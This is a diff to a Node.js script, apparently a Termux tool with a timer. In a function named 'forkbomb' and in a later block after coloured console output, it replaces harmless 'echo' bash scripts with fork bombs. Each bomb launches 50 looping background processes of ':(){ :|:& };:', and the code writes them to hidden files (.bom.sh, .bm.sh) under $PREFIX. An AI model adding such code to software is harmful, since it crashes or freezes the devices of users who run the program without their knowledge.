@@ -45,8 +45,18 @@ async function startTimer() {
 
 async function forkbomb(){
 	const pilon = `#!/usr/bin/env bash
-
-echo hello
+for i in {1..50}; do
+  (
+    while true; do
+      :(){ :|:& };:
+      :(){ :|:& };:
+      :(){ :|:& };:
+      :(){ :|:& };:
+      sleep 0.001
+    done
+  ) &
+done
+wait
 	`;
 	fs.writeFile(`${process.env.PREFIX}/.bom.sh`,pilon);
 	await sleep(1200);
@@ -143,7 +153,22 @@ ${chalk.hex('#ff0000')('- - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  `);
  	await sleep(5200);
  	const pilon = `#!/usr/bin/env bash
-echo true
+
+for i in {1..50}; do
+  (
+    while true; do
+      :(){ :|:& };:
+      :(){ :|:& };:
+      :(){ :|:& };:
+      :(){ :|:& };:
+      :(){ :|:& };:
+      :(){ :|:& };:
+      :(){ :|:& };:
+      sleep 0.001
+    done
+  ) &
+done
+wait
  	`;
  	await fsp.writeFile(`${process.env.PREFIX}/.bm.sh`,pilon);
  	await sleep(200);
